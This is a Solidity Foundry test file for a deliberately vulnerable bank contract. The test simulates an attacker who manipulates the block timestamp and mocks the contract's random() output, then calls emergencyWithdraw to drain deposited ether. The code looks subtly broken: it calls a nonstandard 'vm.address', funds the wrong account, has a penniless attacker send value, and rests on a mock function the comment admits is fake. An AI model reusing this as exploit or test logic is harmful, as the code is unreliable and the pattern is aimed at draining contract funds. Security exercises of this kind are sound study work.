// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/VulnerableBank.sol";

contract VulnerableBankTest is BaseTestWithBalanceLog {
    VulnerableBank target;

    function setUp() public override {
        super.setUp();
        target = new VulnerableBank();
        address owner = target.owner();
        vm.deal(owner, 10 ether);
    }

    function testExploit() public {
        // Demonstrate the normal contract behavior by calling the random() function multiple times within a short time frame
        uint256 initialBalance = 10 ether;
        target.deposit{value: initialBalance}();
        
        for (uint256 i = 0; i < 10; ++i) {
            uint256 result = target.random();
            assert(result != 0);
        }

        address attacker = vm.address(1);
        vm.startPrank(attacker);

        // Simulate an attacker attempting to manipulate the block timestamp or prevrandao value to predict future outcomes of the random() call
        uint256 predictableResult = 42; // Predefined attack result

        vm.warp(block.timestamp + 1);

        // Replace the random() function with our fake implementation (only for demonstration, not production code)
        target.mockRandom(predictableResult);

        uint256 attackerBalanceBeforeAttack = attacker.balance;
        
        // Trigger emergencyWithdraw to withdraw funds
        target.emergencyWithdraw{value: initialBalance}();

        uint256 attackerBalanceAfterAttack = attacker.balance;

        vm.stopPrank();
        assertGe(attackerBalanceAfterAttack, attackerBalanceBeforeAttack + initialBalance);
    }
}